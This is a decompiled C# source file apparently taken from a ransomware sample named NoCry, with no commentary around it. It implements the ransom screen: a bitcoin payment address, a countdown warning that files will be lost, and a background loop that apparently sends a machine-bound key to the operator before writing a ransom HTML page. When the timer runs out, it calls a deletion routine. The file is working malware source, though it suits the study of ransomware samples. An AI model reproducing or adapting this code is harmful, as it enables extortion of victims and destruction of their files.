// Decompiled with JetBrains decompiler
// Type: NoCry.Form1
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D065D6FB-0B25-4594-BF1F-FFB7B28602E9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-a9a0a2e8c6150a5588fc69d5d65859d5c670f52f5dc5ff087bd0203e1cf5fa75.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace NoCry
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private double hour;
    private double minute;
    private double second;
    private object h;
    private object m;
    private object s;
    private object P;
    private object mx;
    private IContainer components;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.h = (object) Interaction.GetSetting("H", "0", St.Setting);
      this.m = (object) Interaction.GetSetting("M", "0", St.Setting);
      this.s = (object) Interaction.GetSetting("S", "0", St.Setting);
      this.P = (object) Interaction.GetSetting(nameof (P), "0", St.Setting);
      this.mx = (object) Interaction.GetSetting("X", "0", St.Setting);
      this.InitializeComponent();
    }

    private void PictureBox1_Click(object sender, EventArgs e)
    {
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      try
      {
        Clipboard.SetText(this.TextBox1.Text);
        int num = (int) MessageBox.Show("Copied To Clipboard");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.Label1.Text = "Send $" + St.amount + " worth of bitcoin to this address:";
        this.TextBox1.Text = St.btc;
        if (Operators.ConditionalCompareObjectEqual(this.h, (object) null, false))
        {
          Interaction.SaveSetting("H", "0", St.Setting, Conversions.ToString(St.H));
          this.hour = Conversions.ToDouble(Interaction.GetSetting("H", "0", St.Setting));
          this.ProgressBar1.Maximum = Conversions.ToInteger(Interaction.GetSetting("H", "0", St.Setting));
        }
        else
          this.hour = Conversions.ToDouble(Interaction.GetSetting("H", "0", St.Setting));
        if (Operators.ConditionalCompareObjectEqual(this.m, (object) null, false))
        {
          Interaction.SaveSetting("M", "0", St.Setting, Conversions.ToString(St.m));
          this.minute = Conversions.ToDouble(Interaction.GetSetting("M", "0", St.Setting));
        }
        else
          this.minute = Conversions.ToDouble(Interaction.GetSetting("M", "0", St.Setting));
        if (Operators.ConditionalCompareObjectEqual(this.s, (object) null, false))
        {
          Interaction.SaveSetting("S", "0", St.Setting, Conversions.ToString(59));
          this.second = Conversions.ToDouble(Interaction.GetSetting("S", "0", St.Setting));
        }
        else
          this.second = Conversions.ToDouble(Interaction.GetSetting("S", "0", St.Setting));
        if (Operators.ConditionalCompareObjectEqual(this.P, (object) null, false))
        {
          Interaction.SaveSetting("P", "0", St.Setting, Conversions.ToString(0));
          this.ProgressBar1.Value = Conversions.ToInteger(Interaction.GetSetting("P", "0", St.Setting));
        }
        else
          this.ProgressBar1.Value = Conversions.ToInteger(Interaction.GetSetting("P", "0", St.Setting));
        if (Operators.ConditionalCompareObjectEqual(this.mx, (object) null, false))
        {
          Interaction.SaveSetting("X", "0", St.Setting, Conversions.ToString(St.H));
          this.ProgressBar1.Maximum = Conversions.ToInteger(Interaction.GetSetting("X", "0", St.Setting));
        }
        else
          this.ProgressBar1.Maximum = Conversions.ToInteger(Interaction.GetSetting("X", "0", St.Setting));
        this.Timer1.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void LinkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("https://www.google.com/search?q=how+to+buy+bitcoin");

    private void Button1_Click(object sender, EventArgs e) => MyProject.Forms.Form2.Show();

    private void Button1_Click_1(object sender, EventArgs e)
    {
      Form2 form2 = new Form2();
      form2.StartPosition = FormStartPosition.CenterParent;
      int num = (int) form2.ShowDialog();
    }

    private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
      Form3 form3 = new Form3();
      form3.StartPosition = FormStartPosition.CenterParent;
      int num = (int) form3.ShowDialog();
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      Form4 form4 = new Form4();
      form4.StartPosition = FormStartPosition.CenterParent;
      int num = (int) form4.ShowDialog();
    }

    private void LinkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("https://en.wikipedia.org/wiki/Bitcoin");

    protected override CreateParams CreateParams
    {
      get
      {
        CreateParams createParams = base.CreateParams;
        createParams.ClassStyle |= 512;
        return createParams;
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        if (this.hour == 0.0 & this.minute == 0.0)
        {
          this.Label9.Text = "0";
          this.Label7.Text = "0";
          this.Timer1.Stop();
          this.Hide();
          Interaction.SaveSetting("D", "0", St.Setting, "OK");
          del.del();
        }
        else
        {
          this.Label9.Text = Conversions.ToString(this.hour);
          this.Label7.Text = Conversions.ToString(this.minute);
          Interaction.SaveSetting("H", "0", St.Setting, Conversions.ToString(this.hour));
          Interaction.SaveSetting("M", "0", St.Setting, Conversions.ToString(this.minute));
          Interaction.SaveSetting("S", "0", St.Setting, Conversions.ToString(this.second));
        }
        if (this.minute == 0.0)
        {
          --this.hour;
          this.minute = 59.0;
          this.ProgressBar1.Increment(1);
          Interaction.SaveSetting("P", "0", St.Setting, Conversions.ToString(this.ProgressBar1.Value));
        }
        else if (this.second == 0.0)
        {
          --this.minute;
          this.second = 59.0;
        }
        else
          --this.second;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      do
      {
        Thread.Sleep(2000);
      }
      while (!Module1.sends(Conversions.ToString(Operators.ConcatenateObject((object) (St.hash + "="), check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting), Module1.HWID() + Module1.HWID())))));
      Interaction.SaveSetting("F", "0", St.Setting, "Done");
      Interaction.SaveSetting("C", "0", St.Setting, "Done");
      string str = NoCry.My.Resources.Resources.html.Replace("%M%", "$" + St.amount).Replace("%BTC%", St.btc).Replace("%Email%", St.email);
      StreamWriter streamWriter = new StreamWriter(St.html, false);
      streamWriter.WriteLine(str);
      streamWriter.Close();
      if (!this.BackgroundWorker1.IsBusy || !this.BackgroundWorker1.WorkerSupportsCancellation)
        return;
      this.BackgroundWorker1.CancelAsync();
    }

    private void Label3_Click(object sender, EventArgs e)
    {
    }

    private void Label4_Click(object sender, EventArgs e)
    {
    }

    private void ProgressBar1_Click(object sender, EventArgs e)
    {
    }

    private void Label6_Click(object sender, EventArgs e)
    {
    }

    private void Label9_Click(object sender, EventArgs e)
    {
    }

    private void PictureBox3_Click(object sender, EventArgs e)
    {
    }

    private void LinkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
    {
    }

    private void Panel2_Paint(object sender, PaintEventArgs e)
    {
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.Button1 = new Button();
      this.GroupBox1 = new GroupBox();
      this.Button2 = new Button();
      this.TextBox1 = new TextBox();
      this.Label1 = new Label();
      this.PictureBox2 = new PictureBox();
      this.Label2 = new Label();
      this.Label3 = new Label();
      this.Label4 = new Label();
      this.Label5 = new Label();
      this.GroupBox2 = new GroupBox();
      this.VScrollBar1 = new VScrollBar();
      this.Button3 = new Button();
      this.PictureBox1 = new PictureBox();
      this.Panel1 = new Panel();
      this.ProgressBar1 = new ProgressBar();
      this.Label7 = new Label();
      this.Label8 = new Label();
      this.Label9 = new Label();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.BackgroundWorker1 = new BackgroundWorker();
      this.GroupBox3 = new GroupBox();
      this.Label10 = new Label();
      this.Label6 = new Label();
      this.LinkLabel1 = new LinkLabel();
      this.LinkLabel2 = new LinkLabel();
      this.LinkLabel3 = new LinkLabel();
      this.GroupBox1.SuspendLayout();
      ((ISupportInitialize) this.PictureBox2).BeginInit();
      this.GroupBox2.SuspendLayout();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.Panel1.SuspendLayout();
      this.GroupBox3.SuspendLayout();
      this.SuspendLayout();
      this.Button1.BackColor = Color.White;
      this.Button1.Cursor = Cursors.Hand;
      this.Button1.ForeColor = Color.Black;
      this.Button1.Location = new Point(640, 546);
      this.Button1.Margin = new Padding(4);
      this.Button1.Name = "Button1";
      this.Button1.Size = new Size(252, 36);
      this.Button1.TabIndex = 2;
      this.Button1.Text = "Decrypt";
      this.Button1.UseVisualStyleBackColor = false;
      this.GroupBox1.Controls.Add((Control) this.Button2);
      this.GroupBox1.Controls.Add((Control) this.TextBox1);
      this.GroupBox1.Controls.Add((Control) this.Label1);
      this.GroupBox1.Controls.Add((Control) this.PictureBox2);
      this.GroupBox1.Location = new Point(219, 451);
      this.GroupBox1.Margin = new Padding(4);
      this.GroupBox1.Name = "GroupBox1";
      this.GroupBox1.Padding = new Padding(4);
      this.GroupBox1.Size = new Size(727, 89);
      this.GroupBox1.TabIndex = 3;
      this.GroupBox1.TabStop = false;
      this.Button2.BackColor = Color.White;
      this.Button2.Cursor = Cursors.Hand;
      this.Button2.ForeColor = Color.Black;
      this.Button2.Location = new Point(583, 42);
      this.Button2.Margin = new Padding(4);
      this.Button2.Name = "Button2";
      this.Button2.Size = new Size(111, 28);
      this.Button2.TabIndex = 4;
      this.Button2.Text = "Copy";
      this.Button2.UseVisualStyleBackColor = false;
      this.TextBox1.Location = new Point(197, 48);
      this.TextBox1.Margin = new Padding(4);
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.ReadOnly = true;
      this.TextBox1.Size = new Size(371, 22);
      this.TextBox1.TabIndex = 4;
      this.Label1.AutoSize = true;
      this.Label1.Font = new Font("Tahoma", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = Color.FromArgb(192, 192, 0);
      this.Label1.Location = new Point(157, 21);
      this.Label1.Margin = new Padding(4, 0, 4, 0);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(0, 17);
      this.Label1.TabIndex = 4;
      this.PictureBox2.Image = (Image) NoCry.My.Resources.Resources.bitcoin;
      this.PictureBox2.Location = new Point(9, 32);
      this.PictureBox2.Margin = new Padding(4);
      this.PictureBox2.Name = "PictureBox2";
      this.PictureBox2.Size = new Size(180, 49);
      this.PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
      this.PictureBox2.TabIndex = 4;
      this.PictureBox2.TabStop = false;
      this.Label2.AutoSize = true;
      this.Label2.Font = new Font("Tahoma", 14.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 204);
      this.Label2.ForeColor = Color.White;
      this.Label2.Location = new Point(289, 15);
      this.Label2.Margin = new Padding(4, 0, 4, 0);
      this.Label2.Name = "Label2";
      this.Label2.Size = new Size(512, 29);
      this.Label2.TabIndex = 5;
      this.Label2.Text = "Ooops, Your Files Have Been Encrypted !!!";
      this.Label3.AutoSize = true;
      this.Label3.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label3.ForeColor = Color.White;
      this.Label3.Location = new Point(8, 23);
      this.Label3.Margin = new Padding(4, 0, 4, 0);
      this.Label3.Name = "Label3";
      this.Label3.Size = new Size(650, 105);
      this.Label3.TabIndex = 6;
      this.Label3.Text = componentResourceManager.GetString("Label3.Text");
      this.Label4.AutoSize = true;
      this.Label4.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label4.ForeColor = Color.White;
      this.Label4.Location = new Point(8, 138);
      this.Label4.Margin = new Padding(4, 0, 4, 0);
      this.Label4.Name = "Label4";
      this.Label4.Size = new Size(691, 105);
      this.Label4.TabIndex = 7;
      this.Label4.Text = componentResourceManager.GetString("Label4.Text");
      this.Label5.AutoSize = true;
      this.Label5.Font = new Font("Tahoma", 9.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label5.ForeColor = Color.White;
      this.Label5.Location = new Point(8, (int) byte.MaxValue);
      this.Label5.Margin = new Padding(4, 0, 4, 0);
      this.Label5.Name = "Label5";
      this.Label5.Size = new Size(677, 126);
      this.Label5.TabIndex = 8;
      this.Label5.Text = componentResourceManager.GetString("Label5.Text");
      this.GroupBox2.Controls.Add((Control) this.VScrollBar1);
      this.GroupBox2.Controls.Add((Control) this.Label5);
      this.GroupBox2.Controls.Add((Control) this.Label4);
      this.GroupBox2.Controls.Add((Control) this.Label3);
      this.GroupBox2.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.GroupBox2.ForeColor = Color.White;
      this.GroupBox2.Location = new Point(228, 58);
      this.GroupBox2.Margin = new Padding(4);
      this.GroupBox2.Name = "GroupBox2";
      this.GroupBox2.Padding = new Padding(4);
      this.GroupBox2.Size = new Size(718, 396);
      this.GroupBox2.TabIndex = 6;
      this.GroupBox2.TabStop = false;
      this.GroupBox2.Text = "Can I Recover My Files ?";
      this.VScrollBar1.Location = new Point(703, 18);
      this.VScrollBar1.Name = "VScrollBar1";
      this.VScrollBar1.Size = new Size(11, 374);
      this.VScrollBar1.TabIndex = 9;
      this.Button3.BackColor = Color.White;
      this.Button3.Cursor = Cursors.Hand;
      this.Button3.ForeColor = Color.Black;
      this.Button3.Location = new Point(240, 548);
      this.Button3.Margin = new Padding(4);
      this.Button3.Name = "Button3";
      this.Button3.Size = new Size(228, 36);
      this.Button3.TabIndex = 4;
      this.Button3.Text = "Show Encrypted Files";
      this.Button3.UseVisualStyleBackColor = false;
      this.PictureBox1.Image = (Image) NoCry.My.Resources.Resources.Pic1;
      this.PictureBox1.Location = new Point(16, 15);
      this.PictureBox1.Margin = new Padding(4);
      this.PictureBox1.Name = "PictureBox1";
      this.PictureBox1.Size = new Size(179, 161);
      this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.PictureBox1.TabIndex = 0;
      this.PictureBox1.TabStop = false;
      this.Panel1.BackColor = Color.Maroon;
      this.Panel1.BorderStyle = BorderStyle.Fixed3D;
      this.Panel1.Controls.Add((Control) this.ProgressBar1);
      this.Panel1.Controls.Add((Control) this.Label7);
      this.Panel1.Controls.Add((Control) this.Label8);
      this.Panel1.Controls.Add((Control) this.Label9);
      this.Panel1.Location = new Point(26, 75);
      this.Panel1.Margin = new Padding(4);
      this.Panel1.Name = "Panel1";
      this.Panel1.Size = new Size(157, 62);
      this.Panel1.TabIndex = 13;
      this.ProgressBar1.Location = new Point(3, 39);
      this.ProgressBar1.Margin = new Padding(4);
      this.ProgressBar1.Maximum = 71;
      this.ProgressBar1.Name = "ProgressBar1";
      this.ProgressBar1.Size = new Size(145, 12);
      this.ProgressBar1.TabIndex = 4;
      this.Label7.AutoSize = true;
      this.Label7.Font = new Font("MS Gothic", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label7.ForeColor = Color.White;
      this.Label7.Location = new Point(94, 7);
      this.Label7.Margin = new Padding(4, 0, 4, 0);
      this.Label7.Name = "Label7";
      this.Label7.Size = new Size(40, 28);
      this.Label7.TabIndex = 3;
      this.Label7.Text = "00";
      this.Label8.AutoSize = true;
      this.Label8.Font = new Font("Tahoma", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.Label8.ForeColor = Color.White;
      this.Label8.Location = new Point(61, 2);
      this.Label8.Margin = new Padding(4, 0, 4, 0);
      this.Label8.Name = "Label8";
      this.Label8.Size = new Size(25, 33);
      this.Label8.TabIndex = 2;
      this.Label8.Text = ":";
      this.Label9.AutoSize = true;
      this.Label9.Font = new Font("MS Gothic", 16.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label9.ForeColor = Color.White;
      this.Label9.Location = new Point(11, 7);
      this.Label9.Margin = new Padding(4, 0, 4, 0);
      this.Label9.Name = "Label9";
      this.Label9.Size = new Size(40, 28);
      this.Label9.TabIndex = 1;
      this.Label9.Text = "00";
      this.Timer1.Interval = 1000;
      this.BackgroundWorker1.WorkerReportsProgress = true;
      this.BackgroundWorker1.WorkerSupportsCancellation = true;
      this.GroupBox3.Controls.Add((Control) this.Label10);
      this.GroupBox3.Controls.Add((Control) this.Label6);
      this.GroupBox3.Controls.Add((Control) this.Panel1);
      this.GroupBox3.Location = new Point(12, 210);
      this.GroupBox3.Name = "GroupBox3";
      this.GroupBox3.Size = new Size(217, 154);
      this.GroupBox3.TabIndex = 9;
      this.GroupBox3.TabStop = false;
      this.Label10.AutoSize = true;
      this.Label10.ForeColor = SystemColors.ButtonHighlight;
      this.Label10.Location = new Point(77, 45);
      this.Label10.Name = "Label10";
      this.Label10.Size = new Size(61, 16);
      this.Label10.TabIndex = 5;
      this.Label10.Text = "Time left:";
      this.Label6.AutoSize = true;
      this.Label6.ForeColor = Color.Yellow;
      this.Label6.Location = new Point(38, 18);
      this.Label6.Name = "Label6";
      this.Label6.Size = new Size(154, 16);
      this.Label6.TabIndex = 14;
      this.Label6.Text = "Your Files will be lost On:";
      this.LinkLabel1.AutoSize = true;
      this.LinkLabel1.Cursor = Cursors.Hand;
      this.LinkLabel1.Font = new Font("Tahoma", 11.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.LinkLabel1.LinkColor = Color.FromArgb(0, 192, 192);
      this.LinkLabel1.Location = new Point(12, 531);
      this.LinkLabel1.Margin = new Padding(4, 0, 4, 0);
      this.LinkLabel1.Name = "LinkLabel1";
      this.LinkLabel1.Size = new Size(114, 23);
      this.LinkLabel1.TabIndex = 10;
      ((Label) this.LinkLabel1).TabStop = true;
      this.LinkLabel1.Text = "Contact Us";
      this.LinkLabel2.AutoSize = true;
      this.LinkLabel2.Cursor = Cursors.Hand;
      this.LinkLabel2.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.LinkLabel2.LinkColor = Color.FromArgb(0, 192, 192);
      this.LinkLabel2.Location = new Point(13, 483);
      this.LinkLabel2.Margin = new Padding(4, 0, 4, 0);
      this.LinkLabel2.Name = "LinkLabel2";
      this.LinkLabel2.Size = new Size(164, 21);
      this.LinkLabel2.TabIndex = 11;
      ((Label) this.LinkLabel2).TabStop = true;
      this.LinkLabel2.Text = "How to buy bitcoins?";
      this.LinkLabel3.AutoSize = true;
      this.LinkLabel3.Cursor = Cursors.Hand;
      this.LinkLabel3.Font = new Font("Tahoma", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.LinkLabel3.LinkColor = Color.FromArgb(0, 192, 192);
      this.LinkLabel3.Location = new Point(8, 433);
      this.LinkLabel3.Margin = new Padding(4, 0, 4, 0);
      this.LinkLabel3.Name = "LinkLabel3";
      this.LinkLabel3.Size = new Size(108, 21);
      this.LinkLabel3.TabIndex = 12;
      ((Label) this.LinkLabel3).TabStop = true;
      this.LinkLabel3.Text = "About bitcoin";
      this.AutoScaleDimensions = new SizeF(8f, 16f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoSizeMode = AutoSizeMode.GrowAndShrink;
      this.BackColor = Color.Maroon;
      this.ClientSize = new Size(963, 597);
      this.Controls.Add((Control) this.LinkLabel1);
      this.Controls.Add((Control) this.LinkLabel3);
      this.Controls.Add((Control) this.LinkLabel2);
      this.Controls.Add((Control) this.GroupBox3);
      this.Controls.Add((Control) this.GroupBox2);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.GroupBox1);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.PictureBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Margin = new Padding(4);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Ransomware Decryptor";
      this.TopMost = true;
      this.GroupBox1.ResumeLayout(false);
      this.GroupBox1.PerformLayout();
      ((ISupportInitialize) this.PictureBox2).EndInit();
      this.GroupBox2.ResumeLayout(false);
      this.GroupBox2.PerformLayout();
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.Panel1.ResumeLayout(false);
      this.Panel1.PerformLayout();
      this.GroupBox3.ResumeLayout(false);
      this.GroupBox3.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.PictureBox1_Click);
        PictureBox pictureBox1_1 = this._PictureBox1;
        if (pictureBox1_1 != null)
          pictureBox1_1.Click -= eventHandler;
        this._PictureBox1 = value;
        PictureBox pictureBox1_2 = this._PictureBox1;
        if (pictureBox1_2 == null)
          return;
        pictureBox1_2.Click += eventHandler;
      }
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click_1);
        Button button1_1 = this._Button1;
        if (button1_1 != null)
          button1_1.Click -= eventHandler;
        this._Button1 = value;
        Button button1_2 = this._Button1;
        if (button1_2 == null)
          return;
        button1_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("GroupBox1")]
    internal virtual GroupBox GroupBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PictureBox2")]
    internal virtual PictureBox PictureBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button2
    {
      get => this._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        Button button2_1 = this._Button2;
        if (button2_1 != null)
          button2_1.Click -= eventHandler;
        this._Button2 = value;
        Button button2_2 = this._Button2;
        if (button2_2 == null)
          return;
        button2_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("TextBox1")]
    internal virtual TextBox TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label Label3
    {
      get => this._Label3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label3_Click);
        Label label3_1 = this._Label3;
        if (label3_1 != null)
          label3_1.Click -= eventHandler;
        this._Label3 = value;
        Label label3_2 = this._Label3;
        if (label3_2 == null)
          return;
        label3_2.Click += eventHandler;
      }
    }

    internal virtual Label Label4
    {
      get => this._Label4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label4_Click);
        Label label4_1 = this._Label4;
        if (label4_1 != null)
          label4_1.Click -= eventHandler;
        this._Label4 = value;
        Label label4_2 = this._Label4;
        if (label4_2 == null)
          return;
        label4_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label5")]
    internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("GroupBox2")]
    internal virtual GroupBox GroupBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button3
    {
      get => this._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        Button button3_1 = this._Button3;
        if (button3_1 != null)
          button3_1.Click -= eventHandler;
        this._Button3 = value;
        Button button3_2 = this._Button3;
        if (button3_2 == null)
          return;
        button3_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Panel1")]
    internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual ProgressBar ProgressBar1
    {
      get => this._ProgressBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ProgressBar1_Click);
        ProgressBar progressBar1_1 = this._ProgressBar1;
        if (progressBar1_1 != null)
          progressBar1_1.Click -= eventHandler;
        this._ProgressBar1 = value;
        ProgressBar progressBar1_2 = this._ProgressBar1;
        if (progressBar1_2 == null)
          return;
        progressBar1_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label7")]
    internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label8")]
    internal virtual Label Label8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label Label9
    {
      get => this._Label9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label9_Click);
        Label label9_1 = this._Label9;
        if (label9_1 != null)
          label9_1.Click -= eventHandler;
        this._Label9 = value;
        Label label9_2 = this._Label9;
        if (label9_2 == null)
          return;
        label9_2.Click += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        System.Windows.Forms.Timer timer1_1 = this._Timer1;
        if (timer1_1 != null)
          timer1_1.Tick -= eventHandler;
        this._Timer1 = value;
        System.Windows.Forms.Timer timer1_2 = this._Timer1;
        if (timer1_2 == null)
          return;
        timer1_2.Tick += eventHandler;
      }
    }

    internal virtual BackgroundWorker BackgroundWorker1
    {
      get => this._BackgroundWorker1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
        BackgroundWorker backgroundWorker1_1 = this._BackgroundWorker1;
        if (backgroundWorker1_1 != null)
          backgroundWorker1_1.DoWork -= workEventHandler;
        this._BackgroundWorker1 = value;
        BackgroundWorker backgroundWorker1_2 = this._BackgroundWorker1;
        if (backgroundWorker1_2 == null)
          return;
        backgroundWorker1_2.DoWork += workEventHandler;
      }
    }

    [field: AccessedThroughProperty("GroupBox3")]
    internal virtual GroupBox GroupBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Label Label6
    {
      get => this._Label6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Label6_Click);
        Label label6_1 = this._Label6;
        if (label6_1 != null)
          label6_1.Click -= eventHandler;
        this._Label6 = value;
        Label label6_2 = this._Label6;
        if (label6_2 == null)
          return;
        label6_2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label10")]
    internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual LinkLabel LinkLabel1
    {
      get => this._LinkLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.LinkLabel1_LinkClicked);
        LinkLabel linkLabel1_1 = this._LinkLabel1;
        if (linkLabel1_1 != null)
          linkLabel1_1.LinkClicked -= clickedEventHandler;
        this._LinkLabel1 = value;
        LinkLabel linkLabel1_2 = this._LinkLabel1;
        if (linkLabel1_2 == null)
          return;
        linkLabel1_2.LinkClicked += clickedEventHandler;
      }
    }

    internal virtual LinkLabel LinkLabel2
    {
      get => this._LinkLabel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.LinkLabel2_LinkClicked);
        LinkLabel linkLabel2_1 = this._LinkLabel2;
        if (linkLabel2_1 != null)
          linkLabel2_1.LinkClicked -= clickedEventHandler;
        this._LinkLabel2 = value;
        LinkLabel linkLabel2_2 = this._LinkLabel2;
        if (linkLabel2_2 == null)
          return;
        linkLabel2_2.LinkClicked += clickedEventHandler;
      }
    }

    internal virtual LinkLabel LinkLabel3
    {
      get => this._LinkLabel3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.LinkLabel3_LinkClicked);
        LinkLabel linkLabel3_1 = this._LinkLabel3;
        if (linkLabel3_1 != null)
          linkLabel3_1.LinkClicked -= clickedEventHandler;
        this._LinkLabel3 = value;
        LinkLabel linkLabel3_2 = this._LinkLabel3;
        if (linkLabel3_2 == null)
          return;
        linkLabel3_2.LinkClicked += clickedEventHandler;
      }
    }

    [field: AccessedThroughProperty("VScrollBar1")]
    internal virtual VScrollBar VScrollBar1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }
  }
}
